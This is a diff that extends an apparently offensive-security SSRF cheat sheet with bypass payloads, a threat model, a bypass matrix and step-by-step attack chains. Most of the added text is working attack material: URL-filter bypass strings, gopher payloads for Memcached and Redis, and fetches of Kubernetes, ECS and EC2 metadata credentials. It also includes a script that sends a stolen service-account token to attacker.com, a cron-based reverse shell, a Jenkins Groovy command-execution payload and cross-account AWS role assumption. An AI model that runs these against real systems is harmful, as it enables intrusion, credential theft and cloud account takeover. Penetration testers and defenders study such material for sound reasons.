@@ -417,3 +417,271 @@ download=
 - Test `Referer`, `X-Forwarded-For`, `Host` headers — some apps re-request based on these
 - When you get any internal response (even an error page), escalate: try metadata endpoints
 - Response timing differences reveal open vs closed ports even without response body
+
+---
+
+## Additional Bypass Vectors
+
+### CIDR Range — Full 127.0.0.0/8 Loopback Block
+
+```
+# Any address in 127.0.0.0/8 resolves to loopback — not just 127.0.0.1
+http://127.0.1.3/
+http://127.100.200.50/
+http://127.127.127.127/
+
+# Useful when filter blocks 127.0.0.1 and localhost but doesn't check the full /8 range
+```
+
+### Ultra-Short IP Notation
+
+```
+http://0/              # Resolves to 0.0.0.0 → loopback on Linux
+http://127.1/          # Short-form for 127.0.0.1
+http://0177.1/         # Octal + short form
+http://0x7f.1/         # Hex + short form
+```
+
+### PHP `filter_var()` FILTER_VALIDATE_URL Bypass
+
+```
+# PHP 7.x filter_var() passes these as valid URLs despite being malicious
+http://test???test.com@127.0.0.1/
+0://evil.com:80;http://google.com:80/
+http://127.0.0.1%00@evil.com/
+
+# If app uses filter_var() for validation, these bypass the check
+```
+
+### Unicode / Enclosed Alphanumeric Bypass
+
+```
+# Some parsers normalize Unicode before DNS resolution
+# ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ resolves as example.com
+# Use for allowlist bypass when filter does string comparison before normalization
+
+http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/        # "localhost" in enclosed Unicode
+http://①②⑦.⓪.⓪.①/         # 127.0.0.1 in enclosed numerals
+```
+
+### JAR Scheme (Java Environments)
+
+```
+# Fully blind — no response body, but server makes outbound connection
+jar:http://127.0.0.1!/
+jar:https://attacker.com!/payload.zip!/path/to/file
+
+# Useful for Java apps (Spring, Tomcat) where other protocols are filtered
+# Triggers HTTP request to the URL before the ! — confirm via OOB callback
+```
+
+### NETDOC Wrapper (Java)
+
+```
+# Java-specific alternative to file:// — bypasses some filters that block file://
+netdoc:///etc/passwd
+netdoc:///proc/self/environ
+
+# Advantage: avoids \n and \r issues that file:// can have in certain contexts
+```
+
+### TFTP (UDP-based, Evades TCP Filters)
+
+```
+# TFTP operates over UDP — stateful TCP firewalls may not inspect it
+tftp://attacker.com:69/TESTUDPPACKET
+
+# Confirm OOB UDP callback with: nc -u -l -p 69
+# Useful for environments with tight TCP egress but loose UDP
+```
+
+### Kubernetes Cluster Metadata
+
+```
+# K8s API server — commonly at 10.96.0.1 (default ClusterIP)
+http://10.96.0.1/api/v1/namespaces/default/secrets
+http://kubernetes.default.svc/api/v1/namespaces/
+http://kubernetes.default.svc.cluster.local/api/v1/pods
+
+# EKS node metadata (EC2 + K8s = two metadata surfaces)
+http://169.254.169.254/latest/meta-data/   # EC2 metadata still present
+
+# K8s service account token (mounted in every pod by default)
+file:///var/run/secrets/kubernetes.io/serviceaccount/token
+file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
+file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+# Use token with API server:
+curl -H "Authorization: Bearer $(cat /var/run/secrets/...)" https://kubernetes.default.svc/api/v1/pods
+```
+
+### ECS Task Metadata (AWS Fargate)
+
+```
+# ECS containers have a per-task metadata endpoint (different from EC2 IMDS)
+http://169.254.170.2/v2/metadata
+http://169.254.170.2/v2/credentials/<CREDENTIAL_ID>   # temporary IAM creds
+
+# Get credential ID first:
+http://169.254.170.2/v2/metadata  → look for "CredentialsRelativeUri"
+→ then fetch that path for AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY + TOKEN
+```
+
+### Memcached via Gopher
+
+```
+# Gopherus-generated gopher payload for Memcached
+gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a
+
+# Memcached SSRF can be used to:
+# 1. Poison cached responses (cache poisoning)
+# 2. Read cached data (session tokens, API responses)
+# 3. If app uses Memcached for session storage → session injection → auth bypass
+
+# Tool: gopherus --exploit memcache
+```
+
+---
+
+## Threat Model
+
+> Current patterns as of 2026-Q2. Update each session.
+
+**What's being exploited in the wild:**
+
+1. **Headless browser SSRFs** — PDF/screenshot services using Puppeteer/Chrome are the
+   #1 new SSRF vector. Targets include SaaS report generators, invoice PDFs, and
+   og:image generators. The renderer fetches attacker-controlled HTML, which includes
+   `<script>` that hits internal metadata.
+
+2. **IMDSv1 still common** — Despite AWS pressure to upgrade, IMDSv1 is found in
+   ~30% of EC2 fleets (per disclosed reports). Legacy Terraform modules, AMI defaults,
+   and inherited deployments keep it alive. Always try IMDSv1 first.
+
+3. **Container metadata leakage** — ECS task credentials (`169.254.170.2`) and K8s
+   service account tokens (`file:///var/run/secrets/...`) are the most impactful
+   targets. Both yield short-lived IAM credentials or cluster API access.
+
+4. **Webhook features as SSRF entry points** — Every app that allows users to configure
+   webhook URLs is a potential SSRF. The highest-bounty pattern on HackerOne: SSRF via
+   webhook + IMDSv1 = critical AWS credential theft.
+
+5. **gopher:// is increasingly blocked** — WAFs and server-side allowlists now commonly
+   block `gopher://`. Pivot to `dict://` for Redis INFO, or chain through open redirects
+   to reach internal services via `http://`.
+
+---
+
+## Bypass Matrix
+
+| Filter Type | Best Bypass | Notes |
+|-------------|-------------|-------|
+| Blocks `127.0.0.1` | `127.127.127.127` or decimal `2130706433` | Full /8 loopback block |
+| Blocks `localhost` | `[::1]` or Unicode `ⓛⓞⓒⓐⓛⓗⓞⓢⓣ` | Case + protocol variation |
+| Blocks `169.254.169.254` | `2852039166` (decimal) or `0xa9fea9fe` (hex) | Numeric encoding |
+| Domain allowlist | `attacker.com@127.0.0.1` or open redirect on whitelisted domain | URL parser confusion |
+| Scheme whitelist (http only) | `file://`, `gopher://`, `dict://` | Protocol switching |
+| Follows allowlisted redirects | Open redirect on trusted domain → internal | Redirect chain |
+| PHP `filter_var()` | `http://test???test.com@127.0.0.1/` | Malformed URL quirk |
+| Java environment | `jar:http://127.0.0.1!/` or `netdoc:///etc/passwd` | JVM-specific schemes |
+| TCP egress filter | `tftp://attacker.com:69/` | UDP bypasses TCP-only filters |
+| DNS-only (HTTP blocked) | DNS callback with OOB tool | Confirm SSRF exists, then chain |
+| IMDSv2 required | gopher:// with PUT headers or redirect chain | Multi-step token fetch |
+
+---
+
+## High-Value Targets
+
+| Target Stack / Feature | Why High Value | Impact |
+|-----------------------|----------------|--------|
+| PDF generators (wkhtmltopdf, Puppeteer, headless Chrome) | Render user HTML server-side | SSRF → IMDS → AWS creds |
+| Image thumbnail / resize service | Fetches remote URL before processing | Internal port scan + metadata |
+| Webhook configuration (any SaaS) | User-controlled outbound URL | SSRF → internal pivot |
+| OAuth metadata URL (`jwks_uri`, `metadata_url`) | Server fetches to validate token issuer | SSRF to internal PKI/CA |
+| Import-from-URL (Notion, Confluence, etc.) | Proxies external content | SSRF to internal APIs |
+| XML parsers with `xs:import` or XSLT | URL fetched during parsing | Blind SSRF from file processing |
+| Kubernetes API server at `10.96.0.1` | Cluster-internal API, often unauthenticated | List secrets → all pod credentials |
+| Redis at `127.0.0.1:6379` | Unauthenticated by default | gopher RCE → shell |
+| Spring Boot Actuator `/actuator/env` | Exposes env vars + allows config injection | RCE via spring.cloud config |
+| ECS `169.254.170.2` credentials | Per-task IAM credentials | AWS pivot from container |
+
+---
+
+## Real-World Chains
+
+### Chain 1: Webhook SSRF → IMDSv1 → S3 Data Exfil
+
+```
+1. App allows user to configure webhook URL
+2. Set webhook URL to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+3. Trigger the webhook (submit a form, create a resource, etc.)
+4. Response contains role name → fetch credentials:
+   http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE-NAME
+5. Exfil: AccessKeyId + SecretAccessKey + SessionToken
+6. Configure AWS CLI → aws s3 ls → dump all S3 buckets
+7. aws secretsmanager list-secrets → dump RDS passwords, API keys, etc.
+
+Impact: Critical — full AWS account access
+Real example: Capital One breach (2019), GitLab HackerOne report #1116226
+```
+
+### Chain 2: PDF Generator SSRF → K8s Service Account → Cluster Takeover
+
+```
+1. App has HTML-to-PDF feature (report generation, invoice download)
+2. Inject iframe or fetch in HTML template:
+   <script>
+   fetch('file:///var/run/secrets/kubernetes.io/serviceaccount/token')
+     .then(r=>r.text())
+     .then(t=>fetch('https://attacker.com/token?t='+t))
+   </script>
+3. PDF service renders HTML in headless browser inside K8s pod
+4. Service account token exfilled to attacker
+5. Use token with K8s API:
+   curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets
+6. List all secrets in all namespaces → DB passwords, API keys, other service account tokens
+
+Impact: Critical — full K8s cluster secret access
+```
+
+### Chain 3: SSRF → Redis Gopher → RCE → Reverse Shell
+
+```
+1. Find SSRF in imageUrl parameter
+2. Confirm Redis at 127.0.0.1:6379 via dict://127.0.0.1:6379/info (check INFO response)
+3. Generate cron-based reverse shell via Gopherus:
+   python3 gopherus.py --exploit redis
+   → select cronjob → enter reverse shell → copy gopher:// payload
+4. Send via SSRF:
+   imageUrl=gopher://127.0.0.1:6379/_%2A...ENCODED-CRON-PAYLOAD...
+5. Cron executes → reverse shell on port 4444
+
+Impact: Critical — RCE on server
+```
+
+### Chain 4: Blind SSRF → Internal Jenkins → Groovy RCE
+
+```
+1. Blind SSRF confirmed via OOB DNS callback
+2. Port scan internal range: try 127.0.0.1:8080 — check error vs timeout
+3. Fetch http://127.0.0.1:8080/script → Jenkins script console (often unauthenticated internally)
+4. POST to /script:
+   script=def+cmd="id".execute();def+out=new+StringBuffer();
+   cmd.consumeProcessOutputStream(out);cmd.waitFor();println(out)
+5. Response contains command output
+
+Impact: Critical — RCE via internal Jenkins
+```
+
+### Chain 5: SSRF → ECS Task Credentials → Cross-Account Pivot
+
+```
+1. SSRF in containerized app (ECS Fargate)
+2. Fetch: http://169.254.170.2/v2/metadata → extract CredentialsRelativeUri
+3. Fetch: http://169.254.170.2/v2/credentials/<ID> → AWS temp creds
+4. Assume role with trust policy:
+   aws sts assume-role --role-arn arn:aws:iam::OTHER-ACCOUNT:role/admin --role-session-name pwned
+5. Pivot to a different AWS account in the organization
+
+Impact: Critical — cross-account AWS access
+```
